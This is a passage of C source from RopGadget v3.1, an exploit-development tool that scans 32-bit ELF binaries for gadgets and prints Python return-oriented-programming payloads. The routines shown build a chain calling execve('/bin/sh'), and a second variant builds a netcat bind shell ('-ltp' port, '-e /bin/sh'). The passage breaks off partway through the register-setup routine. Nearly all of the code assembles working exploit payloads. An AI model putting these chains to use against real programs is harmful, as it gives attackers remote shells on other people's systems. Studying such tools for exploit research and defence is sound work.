/*
** RopGadget - Release v3.1
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** http://shell-storm.org
** 2011-09-05
**
** Redistribution and use in source and binary forms, with or without
** modification, are permitted provided that the following conditions
** are met:
** 1. Redistributions of source code must retain the above copyright
**    notice, this list of conditions and the following disclaimer.
** 2. Redistributions in binary form must reproduce the above copyright
**    notice, this list of conditions and the following disclaimer in the
**    documentation and/or other materials provided with the distribution.
*/

/*
** Make a payload.
** 4 parties:
**
**   1) write "/bin/sh\0" in .data or "/usr/bin/netcat" if -bind flag is enable
**   2) registers initialisation
**   3) initialisation of %eax for execve() syscall
**   4) call "int 0x80" or "sysenter"
**
*/

#include "ropgadget.h"

/* linked list for gadgets */
t_makecode *add_element(t_makecode *old_element, char *instruction, Elf32_Addr addr)
{
  t_makecode *new_element;

  new_element = malloc(sizeof(t_makecode));
  if (new_element == NULL)
    exit(-1);
  new_element->addr        = addr;
  new_element->instruction = instruction;
  new_element->next        = old_element;

  return (new_element);
}

/* free linked list */
static void free_add_element(t_makecode *element)
{
  t_makecode *tmp;

  while (element)
    {
      tmp = element;
      element = tmp->next;
      free(tmp);
    }
}

/* returns addr of instruction */
static Elf32_Addr ret_addr_makecodefunc(t_makecode *list_ins, char *instruction)
{
  char  *p;

  while (list_ins)
    {
      p = list_ins->instruction;
      while (*p != 0)
        {
          if (!match(p, instruction, strlen(instruction)))
            return (list_ins->addr);
          p++;
        }
      list_ins = list_ins->next;
    }
  return (0);
}

/* returns the numbers of pop in the gadget. */
static int how_many_pop(char *gadget)
{
  int  cpt = 0;
  char *p;

  p = gadget;
  while(*p != '\0')
    {
      if (!strncmp(p, "pop", 3))
        cpt++;
      p++;
    }
  return (cpt);
}

/* returns first reg in "mov %e?x,(%e?x)" instruction */
static char *get_first_reg(char *gadget)
{
  char *p;

  p = malloc(4 * sizeof(char));
  if (!p)
    {
      fprintf(stderr, "Error malloc\n");
      exit(EXIT_FAILURE);
    }

  while (*gadget != '(' && *gadget != '\0')
    gadget++;

  gadget -= 4;
  strncpy(p, gadget, 3);
  return (p);
}

/* returns second reg in "mov %e?x,(%e?x)" instruction */
static char *get_second_reg(char *gadget)
{
  char *p;

  p = malloc(4 * sizeof(char));
  if (!p)
    {
      fprintf(stderr, "Error malloc\n");
      exit(EXIT_FAILURE);
    }

  while (*gadget != '(' && *gadget != '\0')
    gadget++;

  gadget += 2;
  strncpy(p, gadget, 3);
  return (p);
}

/* returns the numbers of "pop" befor pop_reg */
static int how_many_pop_before(char *gadget, char *pop_reg)
{
  int cpt = 0;

  while (strncmp(gadget, pop_reg, strlen(pop_reg)) && *gadget != '\0')
    {
      if (!strncmp(gadget, "pop", 3))
        cpt++;
      gadget++;
    }
  return (cpt);
}

/* returns the numbers of "pop" after pop_reg */
static int how_many_pop_after(char *gadget, char *pop_reg)
{
  int cpt = 0;

  while(strncmp(gadget, pop_reg, strlen(pop_reg)))
    {
      if (*gadget == '\0')
        return (0);
      gadget++;
    }
  gadget += strlen(pop_reg);

  while (*gadget != '\0')
    {
      if (!strncmp(gadget, "pop", 3))
        cpt++;
      gadget++;
    }
  return (cpt);
}

/* display padding */
static void display_padding(int i)
{
  while (i != 0)
    {
      fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x42424242)%s\n", BLUE, ENDC);
      i--;
    }
}

/* partie 1 | write /bin/sh in .data for execvet("/bin/sh", NULL, NULL)*/
static void makepartie1_local(t_makecode *list_ins)
{
  Elf32_Addr addr_mov_gadget;
  Elf32_Addr addr_xor_gadget;
  Elf32_Addr addr_pop_stack_gadget;
  Elf32_Addr addr_pop_binsh_gadget;
  char *mov_gadget;
  char *xor_gadget;
  char *pop_stack_gadget;
  char *pop_binsh_gadget;
  char *first_reg;
  char *second_reg;
  char reg_stack[32] = "pop %";
  char reg_binsh[32] = "pop %";
  char instr_xor[32] = "xor %";


  addr_mov_gadget = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
  mov_gadget = get_gadget_since_addr(addr_mov_gadget);

  first_reg = get_first_reg(mov_gadget);
  second_reg = get_second_reg(mov_gadget);

  strncat(reg_stack, second_reg, 3);
  strncat(reg_binsh, first_reg, 3);
  strncat(instr_xor, first_reg, 3);

  addr_pop_stack_gadget = ret_addr_makecodefunc(list_ins, reg_stack);
  pop_stack_gadget = get_gadget_since_addr(addr_pop_stack_gadget);
  addr_pop_binsh_gadget = ret_addr_makecodefunc(list_ins, reg_binsh);
  pop_binsh_gadget = get_gadget_since_addr(addr_pop_binsh_gadget);

  addr_xor_gadget = ret_addr_makecodefunc(list_ins, instr_xor);
  xor_gadget = get_gadget_since_addr(addr_xor_gadget);

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.1%s\n", BLUE, ENDC);

  /*****************\/bin*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data%s\n", BLUE, Addr_sData, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"/bin\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /*****************\//sh*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 4%s\n", BLUE, Addr_sData + 4, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"//sh\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/

  free(first_reg);
  free(second_reg);
}

/* partie 1 bis | write //usr/bin/netcat -ltp6666 -e// /bin //sh in .data */
static void makepartie1_remote(t_makecode *list_ins)
{
  Elf32_Addr addr_mov_gadget;
  Elf32_Addr addr_xor_gadget;
  Elf32_Addr addr_pop_stack_gadget;
  Elf32_Addr addr_pop_binsh_gadget;
  char *mov_gadget;
  char *xor_gadget;
  char *pop_stack_gadget;
  char *pop_binsh_gadget;
  char *first_reg;
  char *second_reg;
  char reg_stack[32] = "pop %";
  char reg_binsh[32] = "pop %";
  char instr_xor[32] = "xor %";


  addr_mov_gadget = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
  mov_gadget = get_gadget_since_addr(addr_mov_gadget);

  first_reg = get_first_reg(mov_gadget);
  second_reg = get_second_reg(mov_gadget);

  strncat(reg_stack, second_reg, 3);
  strncat(reg_binsh, first_reg, 3);
  strncat(instr_xor, first_reg, 3);

  addr_pop_stack_gadget = ret_addr_makecodefunc(list_ins, reg_stack);
  pop_stack_gadget = get_gadget_since_addr(addr_pop_stack_gadget);
  addr_pop_binsh_gadget = ret_addr_makecodefunc(list_ins, reg_binsh);
  pop_binsh_gadget = get_gadget_since_addr(addr_pop_binsh_gadget);

  addr_xor_gadget = ret_addr_makecodefunc(list_ins, instr_xor);
  xor_gadget = get_gadget_since_addr(addr_xor_gadget);

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  fprintf(stdout, "\t\t%s# /bin/sh bindport %s generated by RopGadget v3.1%s\n", BLUE, bind_mode.port, ENDC);

  /*****************\//us*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data%s\n", BLUE, Addr_sData, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"//us\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************r/bi*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 4%s\n", BLUE, Addr_sData + 4, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"r/bi\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /*****************\n/ne*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"n/ne\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************tcat*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 12%s\n", BLUE, Addr_sData + 12, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"tcat\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 16%s\n", BLUE, Addr_sData + 16, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/




  /******************-ltp*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 17%s\n", BLUE, Addr_sData + 17, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"-ltp\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************<PORT>*******************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 21%s\n", BLUE, Addr_sData + 21, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"%s\"%s\n", BLUE, bind_mode.port, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 25%s\n", BLUE, Addr_sData + 25, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/



  /******************-e//\********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 26%s\n", BLUE, Addr_sData + 26, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"-e//\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /*****************\/bin*********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 30%s\n", BLUE, Addr_sData + 30, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"/bin\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\//sh********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 34%s\n", BLUE, Addr_sData + 34, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += \"//sh\"%s\n", BLUE, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************EOF*********************/

  /******************\0***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 38%s\n", BLUE, Addr_sData + 38, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /******************EOF**********************/


  /*********************************** make now arg_tab[] ***********************************/
  /*
  ** data + 0  = "//usr/bin/netcat"
  ** data + 17 = "-ltp6666"
  ** data + 26 = "-e///bin//sh"
  **                          ^
  **                          +-- data + 38
  **
  ** data + 40 = data + 0
  ** data + 44 = data + 17
  ** data + 48 = data + 26
  ** data + 52 = NULL
  */

  /****************** data + 0 ********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 40%s\n", BLUE, Addr_sData + 40, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data%s\n", BLUE, Addr_sData, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************  EOF  **********************/

  /****************** data + 17 ********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 44%s\n", BLUE, Addr_sData + 44, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 17%s\n", BLUE, Addr_sData + 17, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************  EOF  **********************/

  /****************** data + 17 ********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 48%s\n", BLUE, Addr_sData + 48, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_binsh_gadget, pop_binsh_gadget, ENDC);
  display_padding(how_many_pop_before(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 26%s\n", BLUE, Addr_sData + 26, ENDC);
  display_padding(how_many_pop_after(pop_binsh_gadget, reg_binsh));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /*******************  EOF  **********************/

  /****************** \0 [1] ***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 52%s\n", BLUE, Addr_sData + 52, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /****************** \0 [2] ***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 53%s\n", BLUE, Addr_sData + 53, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /****************** \0 [3] ***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 54%s\n", BLUE, Addr_sData + 54, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /****************** \0 [4] ***********************/
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_stack_gadget, pop_stack_gadget, ENDC);
  display_padding(how_many_pop_before(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 55%s\n", BLUE, Addr_sData + 55, ENDC);
  display_padding(how_many_pop_after(pop_stack_gadget, reg_stack));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_xor_gadget, xor_gadget, ENDC);
  display_padding(how_many_pop(xor_gadget));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_mov_gadget, mov_gadget, ENDC);
  display_padding(how_many_pop(mov_gadget));
  /****************** EOF **************************/

  /**************************************** EOF *********************************************/

  free(first_reg);
  free(second_reg);
}

/* partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
static void makepartie2_local(t_makecode *list_ins)
{
  Elf32_Addr addr_pop_ebx;
  Elf32_Addr addr_pop_ecx;
  Elf32_Addr addr_pop_edx;
  char *pop_ebx_gadget;
  char *pop_ecx_gadget;
  char *pop_edx_gadget;

  addr_pop_ebx = ret_addr_makecodefunc(list_ins, "pop %ebx");
  addr_pop_ecx = ret_addr_makecodefunc(list_ins, "pop %ecx");
  addr_pop_edx = ret_addr_makecodefunc(list_ins, "pop %edx");
  pop_ebx_gadget = get_gadget_since_addr(addr_pop_ebx);
  pop_ecx_gadget = get_gadget_since_addr(addr_pop_ecx);
  pop_edx_gadget = get_gadget_since_addr(addr_pop_edx);

  /* set %ebx */
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ebx, pop_ebx_gadget, ENDC);
  display_padding(how_many_pop_before(pop_ebx_gadget, "pop %ebx"));
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data%s\n", BLUE, Addr_sData, ENDC);
  display_padding(how_many_pop_after(pop_ebx_gadget, "pop %ebx"));

  /* set %ecx */
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ecx, pop_ecx_gadget, ENDC);
  display_padding(how_many_pop_before(pop_ecx_gadget, "pop %ecx"));
